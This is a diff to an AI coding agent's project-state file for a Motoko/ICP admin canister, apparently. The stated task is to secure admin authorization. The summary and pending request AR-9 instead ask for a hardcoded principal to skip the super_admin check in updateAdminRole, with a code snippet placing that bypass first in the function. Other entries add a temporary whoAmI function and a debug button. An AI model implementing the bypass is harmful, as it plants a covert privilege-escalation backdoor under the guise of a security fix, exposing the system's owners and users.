@@ -1,6 +1,6 @@
 {
   "schemaVersion": "1.0.0",
-  "projectStateVersion": 5,
+  "projectStateVersion": 7,
   "summary": "Existing Motoko/ICP project with admin canister. Auditing and fixing backend authorization system. Using adminStore : [(Principal, AdminRecord)] with UserRole { #super_admin; #admin }. Phase 1: secure addAdmin, deleteAdmin, updateAdminRole so only #super_admin can call them. Exception: principal qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae bypasses role check in updateAdminRole. Phase 2 (future): audit frontend behavior.",
   "architectural_notes": [
     "Admin storage uses adminStore : [(Principal, AdminRecord)] with UserRole { #super_admin; #admin } — do not change this structure",
@@ -11,8 +11,17 @@
   "known_issues": [
     "Authorization guards for addAdmin, deleteAdmin, updateAdminRole need to be verified/enforced in backend"
   ],
-  "isFixRequest": true,
-  "existing_features": [],
+  "isFixRequest": false,
+  "existing_features": [
+    {
+      "id": "feature-add-a-temporary-debug-button-in-the-frontend-that-calls-actor-whoami-and-displays-the-result-using-alert-or-console-log-place-this-button-in-a-visible-location-e-g-the-admin-dashboard-page-or-login-page-so-it-is-easy-to-test-the-button-should-be-clearly-labeled-test-whoami-no-other-existing-frontend-logic-or-ui-may-be-changed",
+      "title": "Add a temporary debug button in the frontend that calls `actor.whoAmI()` and displays the result using `alert()` or `console.log()`. Place this button in a visible location (e.g., the admin dashboard page or login page) so it is easy to test. The button should be clearly labeled 'Test whoAmI'. No other existing frontend logic or UI may be changed.",
+      "reqIds": [
+        "REQ-8"
+      ],
+      "version": 1
+    }
+  ],
   "new_feature_requests": [
     {
       "id": "AR-1",
@@ -77,6 +86,20 @@
       "summary": "In backend/main.mo, inside the `updateAdminRole` function, add the following bypass check as the very first statement in the function body — before any existing role/authorization checks — so that caller principal `qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae` is immediately allowed to proceed without going through the super admin role check:\n\n```\nif (caller == Principal.fromText(\"qm56h-bpinv-zejzt-qtty4-j2dph-j5h6y-fwxfs-jlsv3-suwa5-poxol-wae\")) {\n  // bypass: allowed without role check\n} else {\n  // existing super_admin guard remains here, unchanged\n};\n```\n\nAll other logic in `updateAdminRole` must remain exactly as-is. No other functions may be modified.",
       "reqIds": [
         "REQ-6"
+      ],
+      "status": "pending"
+    },
+    {
+      "id": "AR-10",
+      "summary": "Add temporary whoAmI() function in backend (returns caller principal as Text) and a temporary button in frontend that calls actor.whoAmI() and displays result via alert or console.log. No other logic should be changed.",
+      "reqIds": [],
+      "status": "pending"
+    },
+    {
+      "id": "AR-11",
+      "summary": "Add a `whoAmI` public shared function to the backend actor in `backend/main.mo` that returns the caller's principal as Text. The function signature must be: `public shared({ caller }) func whoAmI() : async Text { return Principal.toText(caller); }`. No other existing logic may be modified.",
+      "reqIds": [
+        "REQ-7"
       ],
       "status": "pending"
     }
